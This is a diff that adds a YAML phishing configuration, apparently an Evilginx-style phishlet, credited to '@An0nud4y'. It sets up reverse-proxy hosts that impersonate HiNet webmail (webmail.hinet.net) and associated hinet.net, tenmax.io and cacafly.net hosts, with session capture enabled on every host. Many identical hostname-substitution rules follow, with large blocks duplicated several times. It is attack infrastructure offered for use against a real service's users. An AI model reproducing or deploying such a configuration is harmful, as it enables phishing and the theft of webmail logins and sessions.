@@ -1,0 +1,243 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'webmail.hinet.net', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'webmail.hinet.net', session: true, is_landing: false}
+  - {phish_sub: 'ssp', orig_sub: 'ssp', domain: 'hinet.net', session: true, is_landing: false}
+  - {phish_sub: 't.ssp', orig_sub: 't.ssp', domain: 'hinet.net', session: true, is_landing: false}
+  - {phish_sub: 'dmp', orig_sub: 'dmp', domain: 'tenmax.io', session: true, is_landing: false}
+  - {phish_sub: 'tenmax', orig_sub: 'ssp', domain: 'tenmax.io', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'tenmax-static', domain: 'cacafly.net', session: true, is_landing: false}
+  - {phish_sub: 'sg1000', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false} 
+  - {phish_sub: 'sg1001', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}
+  - {phish_sub: 'sg1002', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}  
+  - {phish_sub: 'sg1003', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}    
+  - {phish_sub: 'sg1004', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}
+  - {phish_sub: 'sg1005', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}
+  - {phish_sub: 'sg2000', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false} 
+  - {phish_sub: 'sg2001', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}
+  - {phish_sub: 'sg2002', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}
+  - {phish_sub: 'sg2003', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}  
+  - {phish_sub: 'sg2004', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}  
+  - {phish_sub: 'sg2005', orig_sub: 'sg1002', domain: 'webmail.hinet.net', session: true, is_landing: false}  
+  - {phish_sub: 'p8u', orig_sub: 'p8u', domain: 'hinet.net', session: true, is_landing: false}   
+
+sub_filters:
+  - {triggers_on: 'webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
